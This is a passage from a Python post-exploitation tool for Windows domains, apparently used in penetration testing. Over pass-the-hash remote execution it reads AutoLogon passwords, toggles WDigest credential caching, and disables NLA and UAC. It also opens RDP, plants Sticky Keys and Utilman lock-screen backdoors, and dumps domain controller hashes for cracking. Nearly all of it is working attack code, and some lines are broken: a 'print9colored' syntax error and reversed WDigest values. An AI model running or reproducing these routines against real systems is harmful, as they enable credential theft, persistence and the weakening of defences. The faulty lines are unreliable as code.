				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using allowtgtsessionkey setting...",'red'))
				logging.error("[-]Something went wrong whilst using allowtgtsessionkey setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the autologon registry values
if edq_autologon!='n':
	if len(targets)==1:
		try:
			if edq_autologon.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling AutoLogon:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of AutoLogon:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_autologon.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling AutoLogon:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of AutoLogon:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_autologon.upper()=='Q':
				print(colored("[+]Querying the status of AutoLogon:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of Default Username:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultUserName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of Default Password:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of Default Domain:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultDomainName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using AutoLogon setting...",'red'))
				logging.error("[-]Something went wrong whilst using AutoLogon setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the wdigest registry values
if edq_wdigest!='n':
	if len(targets)==1:
		try:
			if edq_wdigest.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling Wdigest:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of Wdigest:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_wdigest.upper()=='D':
				print9colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling Wdigest:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of Wdigest:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				response = raw_input("[+]Do you wish to log a user off? Y/N (N): ")
				if response in yesanswers:
					print(colored("[+]Querying logged on users:",'green'))
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					print(proc.communicate()[0])
					response = raw_input("[+]Enter the ID of the user you wish to log off: ")

					if response !="":
						print(colored("[+]Attempting to log off user ID "+response,'green'))
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C logoff "+response+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])
						print(colored("[+]Querying logged on users:",'green'))
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])

				sys.exit()

			elif edq_wdigest.upper()=='Q':
				print(colored("[+]Querying the status of Wdigest:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				sys.exit()
			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using Wdigest setting",'red'))
				logging.error("[-]Something went wrong whilst using Wdigest setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the network level authentication registry values
if edq_nla!='n':
	if len(targets)==1:
		try:
			if edq_nla.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling NLA:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 1' 2>/dev/null")

				print(colored("[+]Querying the status of NLA:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()

			elif edq_nla.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling NLA:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 0' 2>/dev/null")

				print(colored("[+]Querying the status of NLA:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()

			elif edq_nla.upper()=='Q':
				print(colored("[+]Querying the status of NLA:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using NLA setting...",'red'))
				logging.error("[-]Something went wrong whilst using NLA setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the RDP registry values and change port from 3389 to 443
if edq_trdp!='n':
	if len(targets)==1:
		try:
			if edq_trdp.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red'))

				print(colored("[+]Setting RDP port to 443:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 443' 2>/dev/null")

				print(colored("[+]Restarting RDP Service:\n",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")

				print(colored("[+]Querying the status of RDP Port:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()

			elif edq_trdp.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red'))

				print(colored("[+]Setting RDP to default port of 3389:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 3389' 2>/dev/null")

				print(colored("[+]Restarting RDP Service:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")

				print(colored("[+]Querying the status of RDP Port:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()

			elif edq_trdp.upper()=='Q':
				print(colored("[+]Querying the status of RDP Port:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the change the RDP Port setting...",'red'))
				logging.error("[-]Something went wrong whilst using the change the RDP Port setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the RDP registry values
if edq_rdp!='n':
	if len(targets)==1:
		try:
			if edq_rdp.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling RDP:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")

				print(colored("[+]Starting RDP Service:\n",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")

				print(colored("[+]Enabling Firewall Exception:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = enable' 2>/dev/null")

				print(colored("[+]Querying the status of RDP:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()

			elif edq_rdp.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling RDP:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 1' 2>/dev/null")

				print(colored("[+]Stopping RDP Service:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")

				print(colored("[+]Disabling Firewall Exception:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = disable' 2>/dev/null")

				print(colored("[+]Querying the status of RDP:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()

			elif edq_rdp.upper()=='Q':
				print(colored("[+]Querying the status of RDP:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the RDP setting...",'red'))
				logging.error("[-]Something went wrong whilst using the RDP setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will add a backdoor to the Windows Logon Screen
if edq_backdoor!='n':
	if len(targets)==1:
		try:
			if edq_backdoor.upper()=='E':
				print(colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red'))

				print(colored("[+]BACKDOOR 1: Sticky Keys - Activate by pressing left shift multiple times at a Locked workstation to stard cmd.exe",'green'))
				print(colored("[+]BACKDOOR 2: Utilman - Activate with Windows Key + U at a Locked Workstation to stard cmd.exe",'green'))
				print(colored("[+]BACKDOOR 3: Utilman Variation - Launch Taskmanager at a Locked Workstation using Windows Key + U\n",'green'))

				response = raw_input("Which Backdoor would you like to set? (1,2,3): ")

				if response =="1":
					print(colored("[+]Enabling BACKDOOR 1: Sticky Keys",'green'))
					print(colored("[+]To use press left shift multiple times at a Locked Workstation:",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
					sys.exit()
				elif response=="2":
					print(colored("[+]Enabling BACKDOOR 2: Utilman",'green'))
					print(colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
					sys.exit()
				elif response=="3":
					print(colored("[+]Enabling BACKDOOR 3: TaskManager",'green'))
					print(colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\\taskmgr.exe\" /f' 2>/dev/null")
					sys.exit()

				sys.exit()

			elif edq_backdoor.upper()=='D':
				print(colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red'))

				print(colored("[+]BACKDOOR 1: Sticky Keys",'green'))
				print(colored("[+]BACKDOOR 2: Utilman\n",'green'))

				response = raw_input("Which Backdoor would you like to disable? (1,2): ")

				if response =="1":
					print(colored("[+]Disabling BACKDOOR 1: Sticky Keys",'green'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
					sys.exit()
				elif response=="2":
					print(colored("[+]Disabling BACKDOOR 2: Utilman",'green'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"\" /f' 2>/dev/null")
					sys.exit()

				sys.exit()

			elif edq_backdoor.upper()=='Q':
				print(colored("[+]Querying the status of Backdoors:",'green'))

				print(colored("[+]BACKDOOR 1: Sticky Keys Status",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"' 2>/dev/null")

				print(colored("[+]BACKDOOR 2: Utilman Status",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\"' 2>/dev/null")

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the Backdoor setting...",'red'))
				logging.error("[-]Something went wrong whilst using the Backdoor setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the UAC registry values
if edq_uac!='n':
	if len(targets)==1:
		try:
			if edq_uac.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling UAC:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 1' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 1' 2>/dev/null")

				sys.exit()

			elif edq_uac.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling UAC:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 0' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 0' 2>/dev/null")

				sys.exit()

			elif edq_uac.upper()=='Q':
				print(colored("[+]Querying the status of UAC:",'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the UAC setting...",'red'))
				logging.error("[-]Something went wrong whilst using the UAC setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will dump hashes from DC using the drsuapi method
if drsuapi in yesanswers:
	if len(targets)==1:
		try:
			checkport()

			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
				print(colored("[-]No secretsdump.py",'red'))
				print(colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow'))
				print(colored("[-]and run: python setup.py install",'yellow'))
				exit(1)
			else:
				print(colored("[+]Found secretsdump",'green'))
			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print(colored("[+]Creating directory for host: "+outputpath+targets[0],'green'))
			else:
				print(colored("[+]Found directory for: "+outputpath+targets[0],'green'))

			if os.path.isfile(outputpath+targets[0]+'/drsuapi_gethashes.txt'):
				print(colored("\n[+]WARNING",'red'))
				response = raw_input("Looks like you have an existing file "+outputpath+targets[0]+'/drsuapi_gethashes.txt'+", do you want to overwrite?: Y/(N) ")
				if response in yesanswers:

					print(colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow'))
					pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(passw)

					if pwdump:
						passw=passw[0:-3]

					response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
					if response in yesanswers:
						if pwdump:
							os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
						else:
							os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
							print(colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green'))
						else:
							print(colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red'))
					else:
						if pwdump:
							os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
						else:
							os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
							print(colored("[+]Found file - completed : "+outputpath+targets[0],'green'))
							hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')

							if qldap in yesanswers:

								#Make sure the domain name entered on the command line matches the dns server domain name
								#if not the ldap lookup will fail.
								detecteddnsservername=dns_server_name(user, passw, targets[0], domain_name)

								if detecteddnsservername!='error':

									if detecteddnsservername!=domain_name:
										print(colored("[!]"+targets[0]+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')+detecteddnsservername)
										response=raw_input("[-]Do you want to replace it? (y/n) ")
										if response in yesanswers:
											domain_name=detecteddnsservername

								print(colored("[+]Checking LM User Account Status",'yellow'))
								userstatus(outputpath,targets[0],'lm_usernames.txt',domain_name)
								print(colored("[+]Checking NT User Account Status",'yellow'))
								userstatus(outputpath,targets[0],'nt_usernames.txt',domain_name)

							if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
								response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
								if response in yesanswers:
									quickjtr(outputpath+targets[0]+"/nt.txt")

					sys.exit()

				else:
					sys.exit()
			else:
